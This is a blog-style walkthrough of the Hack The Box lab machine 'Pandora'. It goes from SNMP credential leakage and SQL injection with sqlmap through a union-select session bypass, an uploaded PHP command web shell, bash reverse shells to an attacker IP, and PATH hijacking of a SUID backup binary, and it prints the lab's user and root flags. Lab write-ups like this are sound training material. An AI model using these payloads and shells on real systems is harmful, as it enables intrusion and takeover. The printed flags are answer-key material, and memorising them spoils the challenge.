---
title: "Pandora from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Pandora from HTB
`nmap`gave this:
```bash
 sudo nmap -sU --min-rate=4000 -T4 10.10.11.136
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 14:10 +04
Nmap scan report for 10.10.11.136
Host is up (0.25s latency).
Not shown: 991 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
161/udp   open   snmp

 nmap -sCV --min-rate 4000 -p- 10.10.11.136
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 14:00 +04

PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
```
Then use `snmpwalk`
```bash
snmpwalk -v 1 -c public 10.10.11.136
```
after long ass wait
```bash
iso.3.6.1.2.1.25.4.2.1.5.1004 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1005 = STRING: "-k start"
	iso.3.6.1.2.1.25.4.2.1.5.1101 = STRING: "-u daniel -p HotelBabylon23"
iso.3.6.1.2.1.25.4.2.1.5.1140 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1142 = STRING: "-k start"
```
With this i can login in `ssh`
```bash
ssh daniel@10.10.11.136
daniel@10.10.11.136's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)


daniel@pandora:~$
```
reading this file tells me that `/var/www/pandora`is being served on `80 port`
```bash
cat /etc/apache2/sites-enabled/pandora.conf


<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```
forwarded port and accessed it:
```bash
ssh -L 8000:127.0.0.1:80 daniel@10.10.11.136
```
Then accessed site and found version, which is exploitable. With `sql-injection`i found `PHSESSID`
```bash
sudo  sqlmap --url="http://localhost:8000/pandora_console/include/chart_generator.php?session_id=''" --current-db --batch



[14:54:39] [INFO] retrieved: 'pandora'
current database: 'pandora'

```

Then listed `tables`in that database
```
sudo  sqlmap --url="http://localhost:8000/pandora_console/include/chart_generator.php?session_id=''" -D pandora --tables --batch


| tservice_element                   |
| tsesion                            |
| tsesion_extended                   |
| tsessions_php                      |
| tskin                              |
```
to get `session_id`we need `tsession_php`table
```bash
 sudo  sqlmap --url="http://localhost:8000/pandora_console/include/chart_generator.php?session_id=''" -D pandora -T tsessions_php --dump --batch


| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:"daniel";
| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b
| gf40pukfdinc63nm5lkroidde6 | NULL
```
We need `matt's `session id.
then access the site with this:
```
http://localhost:8000/pandora_console/include/chart_generator.php?session_id=g4e01qdgk36mfdh90hvcc54umq
```
to become the admin
```
http://localhost:8000/pandora_console/include/chart_generator.php?session_id=1%27%20union%20select%201,2,%27id_usuario|s:5:%22admin%22;%27%20--%20-
```
Then open another `tab`and go to that `port` you will be `admin`
Now you can upload files.
I uploaded `php cmd`on site and got `cmd
```
<?php
system($_REQUEST['cmd']);
?>
```
Then accessed the `cmd`with this link
```
/images/php-shell.php?cmd=id
```
To get reverse shell upload `reverse shell file`and with `cmd`execute it
```bash
# reverse.sh

#!/bin/bash
bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
```
upload it and with `cmd` type:
```bash
/images/php-shell.php?cmd= bash reverse.sh
```
Then you will get `netcat`connection
```bash
rlwrap nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.136] 45852
matt@pandora:/var/www/pandora/pandora_console/images$ id
id
uid=1000(matt) gid=1000(matt) groups=1000(matt)
```
***
User Flag is: b2c37562ccacb9f6a9f6a66a05898fe2
***
Let us find all the files with `SUID` bit set in the whole file system using the find utility with the:
```bash
$ find / -perm -4000 2>/dev/null


/usr/bin/pandora_backup
```
To run that program we must escape the restricted shell which code we can find on `GTFOshells`
```bash
$ echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
```
This will make us able to run the program.
Now to see what this program does we must use `strings`onto it.
We don't have `strings`on machine so we must download it with `nc`
```bash
nc <your_ip> <port> < /usr/bin/pandora_backup # on machine
nc -nlvp <port> > pandora_backup # on your local machine
```
After downloading that file run strings onto it and we are able to find that it uses `tar`with `relative path`so it can be exploited to grant us `root shell`
go to machine and set `$PATH` variable to
```bash
export PATH=/home/matt:$PATH
```
Then in `/home/matt`create file either for `netcat connection`
```bash
$ echo -n '#!/bin/bash
 bash -i >& /dev/tcp/<yourIP>/<PORT> 0>&1' > tar
$ chmod +x tar
$ pandora_backup
```
Then you will get connection on `nc`
```bash
nc -nlvp 1235
listening on [any] 1235 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.136] 47902
bash: cannot set terminal process group (836): Inappropriate ioctl for device
bash: no job control in this shell
root@pandora:/home/matt# id
id
uid=0(root) gid=1000(matt) groups=1000(matt)
```
***
Root Flag is: f0e230f1810a9f5ca79dd2720ea7edb3
***
![](/assets/images/Screenshot from 2024-08-20 20-44-52.png)
